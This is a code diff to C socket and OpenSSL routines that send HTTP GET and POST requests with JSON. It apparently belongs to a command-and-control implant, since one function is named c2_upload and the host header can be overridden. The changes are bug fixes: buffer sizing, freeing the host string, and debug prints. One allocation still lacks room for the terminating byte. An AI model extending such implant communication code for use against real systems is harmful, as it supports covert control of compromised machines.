@@ -52,6 +52,7 @@ void close_connection(int sockfd)
 
 int send_message(int sockfd, char* message, SSL* ssl)
 {
+    printf("in send message\n");
 	int total, sent, bytes;
 	total = strlen(message);
 	sent = 0;
@@ -59,6 +60,7 @@ int send_message(int sockfd, char* message, SSL* ssl)
 	    if(ssl != NULL){
             bytes = SSL_write(ssl,message+sent,total-sent);
 	    }else{
+	        printf("sending bytes\n");
 	        bytes = write(sockfd,message+sent,total-sent);
 	    }
 
@@ -169,7 +171,7 @@ cJSON* get_JSON(char* URL_real, int socketfd)
 	int uri_start = find_char(URL, '/', 3); //we want the uri starting with the 3rd instance of /
 	int host_start = find_char(URL, '/', 2) + 1;
 	char * host;
-	if(!strcmp(HOST_HEADER, "YYY")){
+	if(strlen(HOST_HEADER) == 0){
 	    host = calloc(strlen(URL) + 1, 1);
 	    strncpy(host, URL + host_start, uri_start - host_start);
 	}else{
@@ -177,7 +179,7 @@ cJSON* get_JSON(char* URL_real, int socketfd)
 	}
 	int err, response_length = 4096, json_start;
 	char * response = calloc(response_length, 1);
-	char * message = calloc(strlen(URL) + strlen(HTTP_GET) + strlen(JSON_HEADERS_GET), 1);
+	char * message = calloc(strlen(URL) + strlen(HTTP_GET) + strlen(JSON_HEADERS_GET) + strlen(host) + 1, 1);
 	if(message == NULL){
 		//printf("Failed to allocate enough memory in get_JSON\n");
 		return NULL;
@@ -192,6 +194,7 @@ cJSON* get_JSON(char* URL_real, int socketfd)
 		return NULL;
 	}
 	free(message);
+	if(strlen(HOST_HEADER) == 0){free(host);}
 	//get the data back
 	err = read_from_sock(socketfd, &response, &response_length, ssl);
 	if(err != SUCCESS){
@@ -271,23 +274,25 @@ cJSON* post_JSON(char* URL_real, cJSON* post_data, int socketfd)
 	int response_length = 4096;
 	char * response = calloc(response_length, 1);
 	char * host;
-	if(!strcmp(HOST_HEADER, "YYY")){
+	if(strlen(HOST_HEADER) == 0){
 	    host = calloc(strlen(URL) + 1, 1);
 	    strncpy(host, URL + host_start, uri_start - host_start);
 	}else{
         host = HOST_HEADER;
 	}
-	char * message = calloc(strlen(URL) + strlen(json) + strlen(HTTP_POST) + strlen(JSON_HEADERS_POST) +strlen(JSON_DATA), 1);
+	char * message = calloc(strlen(URL) + strlen(json) + strlen(HTTP_POST) + strlen(JSON_HEADERS_POST) +strlen(JSON_DATA) +strlen(host) + 1, 1);
 	if(message == NULL){
 		//printf("Failed to allocate enough memory to post JSON data\n");
 		return NULL;
 	}
-	strncpy(host, URL + host_start, uri_start - host_start);
+	//strncpy(host, URL + host_start, uri_start - host_start);
 	sprintf(message, HTTP_POST, URL + uri_start); //message = POST /url/to/post HTTP/1.1\r\n
 	sprintf(message + strlen(message), JSON_HEADERS_POST, host, strlen(json));
 	sprintf(message + strlen(message), JSON_DATA, json);
 	free(json);
-	free(host);
+	// make sure we don't accidentally try to free a constant
+	if(strlen(HOST_HEADER) == 0){free(host);}
+	//free(host);
 	//make the post
 	err = send_message(socketfd, message, ssl);
 	if(err != SUCCESS){
@@ -470,7 +475,7 @@ int c2_upload(unsigned int file_id, unsigned char** file_buffer, unsigned int * 
 	int uri_start = find_char(URL, '/', 3); //we want the uri starting with the 3rd instance of /
 	int host_start = find_char(URL, '/', 2) + 1;
 	char * host;
-	if(!strcmp(HOST_HEADER, "YYY")){
+	if(strlen(HOST_HEADER) == 0){
 	    host = calloc(strlen(URL) + 1, 1);
 	    strncpy(host, URL + host_start, uri_start - host_start);
 	}else{
@@ -478,7 +483,7 @@ int c2_upload(unsigned int file_id, unsigned char** file_buffer, unsigned int * 
 	}
 
 	int err;
-	char * message = calloc(strlen(URL) + strlen(HTTP_GET) + strlen(JSON_HEADERS_GET), 1);
+	char * message = calloc(strlen(URL) + strlen(HTTP_GET) + strlen(JSON_HEADERS_GET) + strlen(host), 1);
 	if(message == NULL){
 		//printf("Failed to allocate enough memory in get_JSON\n");
 		return NULL;
@@ -493,6 +498,7 @@ int c2_upload(unsigned int file_id, unsigned char** file_buffer, unsigned int * 
 		return NULL;
 	}
 	free(message);
+	if(strlen(HOST_HEADER) == 0){free(host);}
 	//get the data back
 	err = read_from_sock(sockfd, file_buffer, file_length, ssl);
 	if(err != SUCCESS){
